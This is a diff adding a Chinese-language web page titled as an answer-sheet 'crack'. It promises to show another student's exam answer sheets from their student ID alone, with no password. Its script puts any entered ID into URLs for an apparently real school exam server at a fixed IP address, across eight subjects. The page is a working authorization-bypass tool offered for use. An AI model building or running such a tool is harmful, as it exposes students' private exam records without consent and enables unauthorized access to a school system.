@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>答题卡破解</title>
+    <script src="https://cdn.tailwindcss.com/3.3.3"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
+    <style>
+        body {
+            font-family: 'Noto Sans SC', sans-serif;
+            background-color: #f9fafb;
+            color: #374151;
+            min-height: 100vh;
+        }
+        
+        .simple-card {
+            background-color: white;
+            border: 1px solid #e5e7eb;
+            border-radius: 8px;
+            transition: all 0.2s ease;
+        }
+        
+        .simple-card:hover {
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
+        }
+        
+        .btn-primary {
+            background-color: #4f46e5;
+            color: white;
+            transition: background-color 0.2s ease;
+        }
+        
+        .btn-primary:hover {
+            background-color: #4338ca;
+        }
+        
+        .input-focus:focus {
+            border-color: #4f46e5;
+            outline: none;
+        }
+        
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            padding: 12px 20px;
+            border-radius: 4px;
+            color: white;
+            z-index: 1000;
+            opacity: 0;
+            transform: translateX(100%);
+            transition: opacity 0.3s ease, transform 0.3s ease;
+        }
+        
+        .notification.show {
+            opacity: 1;
+            transform: translateX(0);
+        }
+        
+        .notification.success {
+            background-color: #10b981;
+        }
+        
+        .notification.error {
+            background-color: #ef4444;
+        }
+    </style>
+</head>
+<body class="p-4 md:p-8">
+    <!-- 页面容器 -->
+    <div class="container mx-auto max-w-4xl">
+        <!-- 头部区域 -->
+        <header class="text-center mb-12">
+            <h1 class="text-3xl font-bold mb-4">
+                <i class="fas fa-file-alt mr-2"></i>破解答题卡查看
+            </h1>
+            <p class="text-gray-600 max-w-2xl mx-auto">
+                输入ta的学号，无需知道密码就能查看它的答题卡
+            </p>
+        </header>
+        
+        <!-- 表单区域 -->
+        <section class="simple-card p-6 md:p-8 mb-12">
+            <form id="studentForm" class="max-w-2xl mx-auto">
+                <div class="flex flex-col md:flex-row items-center gap-4">
+                    <div class="flex-1">
+                        <label for="studentId" class="block text-sm font-medium text-gray-700 mb-1">学号</label>
+                        <div class="relative">
+                            <span class="absolute inset-y-0 left-0 flex items-center pl-3 text-gray-500">
+                                <i class="fas fa-id-card"></i>
+                            </span>
+                            <input 
+                                type="text" 
+                                id="studentId" 
+                                name="studentId" 
+                                class="input-focus w-full pl-10 pr-4 py-2 border border-gray-300 rounded-lg" 
+                                placeholder="请输入学号"
+                                required
+                            >
+                        </div>
+                    </div>
+                    <div class="flex-shrink-0">
+                        <label class="block text-sm font-medium text-gray-700 mb-1 opacity-0">提交</label>
+                        <button 
+                            type="submit" 
+                            class="btn-primary font-medium py-2 px-6 rounded-lg flex items-center justify-center"
+                        >
+                            <i class="fas fa-search mr-2"></i>查看答题卡
+                        </button>
+                    </div>
+                </div>
+            </form>
+        </section>
+        
+        <!-- 结果展示区域 -->
+        <section id="resultContainer" class="hidden">
+            <h2 class="text-xl font-bold mb-6 text-center">
+                ta <span id="studentIdDisplay" class="font-semibold text-indigo-600"></span> 的答题卡
+            </h2>
+            
+            <div id="subjectCards" class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <!-- 科目卡片将通过JavaScript动态生成 -->
+            </div>
+        </section>
+
+    </div>
+    
+    <!-- 通知组件 -->
+    <div id="notification" class="notification">
+        <span id="notificationMessage"></span>
+    </div>
+    
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // 表单提交事件处理
+            const studentForm = document.getElementById('studentForm');
+            const resultContainer = document.getElementById('resultContainer');
+            const subjectCards = document.getElementById('subjectCards');
+            const studentIdDisplay = document.getElementById('studentIdDisplay');
+            const notification = document.getElementById('notification');
+            const notificationMessage = document.getElementById('notificationMessage');
+            
+            // 科目配置
+            const subjects = [
+                { id: 1, name: '语文', template: 'http://61.180.120.102:9090/xq/users/paperView?TestID=13&LessonID=1&XHID=学号&XBFlag=0' },
+                { id: 2, name: '数学', template: 'http://61.180.120.102:9090/xq/users/paperView?TestID=13&LessonID=2&XHID=学号&XBFlag=0' },
+                { id: 3, name: '英语', template: 'http://61.180.120.102:9090/xq/users/paperView?TestID=13&LessonID=3&XHID=学号&XBFlag=0' },
+                { id: 4, name: '物理', template: 'http://61.180.120.102:9090/xq/users/paperView?TestID=13&LessonID=4&XHID=学号&XBFlag=0' },
+                { id: 5, name: '历史', template: 'http://61.180.120.102:9090/xq/users/paperView?TestID=13&LessonID=5&XHID=学号&XBFlag=0' },
+                { id: 6, name: '生物', template: 'http://61.180.120.102:9090/xq/users/paperView?TestID=13&LessonID=6&XHID=学号&XBFlag=0' },
+                { id: 7, name: '政治', template: 'http://61.180.120.102:9090/xq/users/paperView?TestID=13&LessonID=7&XHID=学号&XBFlag=0' },
+                { id: 8, name: '地理', template: 'http://61.180.120.102:9090/xq/users/paperView?TestID=13&LessonID=8&XHID=学号&XBFlag=0' }
+            ];
+            
+            // 表单提交处理
+            studentForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                const studentId = document.getElementById('studentId').value.trim();
+                
+                // 表单验证
+                if (!studentId) {
+                    showNotification('请输入学号', 'error');
+                    return;
+                }
+                
+                // 显示结果容器
+                resultContainer.classList.remove('hidden');
+                studentIdDisplay.textContent = studentId;
+                
+                // 清空之前的卡片
+                subjectCards.innerHTML = '';
+                
+                // 生成科目卡片
+                subjects.forEach(subject => {
+                    // 替换URL中的学号
+                    const url = subject.template.replace('学号', studentId);
+                    
+                    // 创建卡片
+                    const card = document.createElement('div');
+                    card.className = 'simple-card p-4';
+                    card.innerHTML = `
+                        <div class="flex justify-between items-center">
+                            <h3 class="text-lg font-medium text-gray-800">${subject.name}</h3>
+                            <button 
+                                class="btn-primary text-white text-sm py-1 px-4 rounded flex items-center"
+                                onclick="openInNewWindow('${url}')"
+                            >
+                                <i class="fas fa-external-link-alt mr-1"></i> 在新窗口打开
+                            </button>
+                        </div>
+                    `;
+                    
+                    subjectCards.appendChild(card);
+                });
+                
+                // 滚动到结果区域
+                resultContainer.scrollIntoView({ behavior: 'smooth' });
+                
+                // 显示成功通知
+                showNotification(`已加载学号 ${studentId} 的所有答题卡`, 'success');
+            });
+            
+            // 打开新窗口函数
+            window.openInNewWindow = function(url) {
+                window.open(url, '_blank');
+            };
+            
+            // 显示通知函数
+            function showNotification(message, type) {
+                notificationMessage.textContent = message;
+                notification.className = `notification ${type}`;
+                
+                // 显示通知
+                setTimeout(() => {
+                    notification.classList.add('show');
+                }, 10);
+                
+                // 3秒后隐藏通知
+                setTimeout(() => {
+                    notification.classList.remove('show');
+                }, 3000);
+            }
+        });
+    </script>
+</body>
+</html>
